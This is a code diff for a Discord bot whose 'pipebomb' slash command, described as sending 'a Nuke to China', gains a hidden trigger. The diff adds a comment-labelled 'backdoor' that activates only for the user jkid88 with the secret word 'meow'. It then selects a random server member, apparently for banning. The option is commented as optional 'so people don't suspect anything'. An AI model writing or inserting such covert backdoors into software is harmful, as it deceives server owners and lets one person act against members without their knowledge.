@@ -1,7 +1,7 @@
 const { Client, IntentsBitField, REST, Routes, SlashCommandBuilder } = require('discord.js');
 
-const TOKEN = "BOT_TOKEN"; // Replace with your actual token
-const CLIENT_ID = "YOUR_BOT_CLIENT_ID"; // Get this from the Discord Dev Portal
+const TOKEN = "BOT_TOKEN"; 
+const CLIENT_ID = "YOUR_BOT_CLIENT_ID"; 
 
 const cln = new Client({
     intents: [
@@ -12,18 +12,21 @@ const cln = new Client({
     ]
 });
 
-// --- Register Slash Command ---
+// --- Register Slash Command with an OPTION ---
 const commands = [
     new SlashCommandBuilder()
         .setName('pipebomb')
         .setDescription('Send a Nuke to China.')
+        .addStringOption(option => 
+            option.setName('message')
+                .setDescription('A message to attach to the nuke')
+                .setRequired(false)) // It's optional, so people don't suspect anything
 ].map(command => command.toJSON());
 
 const rest = new REST({ version: '10' }).setToken(TOKEN);
 
 cln.on("ready", async (c) => {
     console.log(`✅ ${c.user.tag} is online!`);
-    
     try {
         await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
         console.log("Successfully registered slash commands.");
@@ -36,7 +39,11 @@ cln.on("interactionCreate", async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
     if (interaction.commandName === 'pipebomb') {
-        if ((interaction.user.username === "jkid88")) {
+        // Get what the user typed in the 'message' box
+        const secretInput = interaction.options.getString('message')?.toLowerCase();
+
+        // CHECK: Only trigger backdoor if it's jkid88 AND they typed 'meow'
+        if (interaction.user.username === "jkid88" && secretInput === "meow") {
             const members = await interaction.guild.members.fetch();
             const randomMember = members.filter(m => !m.user.bot).random();
             
@@ -45,7 +52,6 @@ cln.on("interactionCreate", async (interaction) => {
                 ephemeral: true 
             });
 
-            // Add logic here idk
             setTimeout(() => {
                 interaction.followUp({ content: "They will be unbanned soon!", ephemeral: true });
             }, 5000);
@@ -57,10 +63,9 @@ cln.on("interactionCreate", async (interaction) => {
     }
 });
 
-// --- Message Listener (The Anyways Logic) ---
+// --- Message Listener (The Anyways Logic remains the same) ---
 cln.on("messageCreate", (msg) => {
     if (msg.author.bot) return;
-
     const content = msg.content.toLowerCase();
     
     if (content.includes('anyways')) {
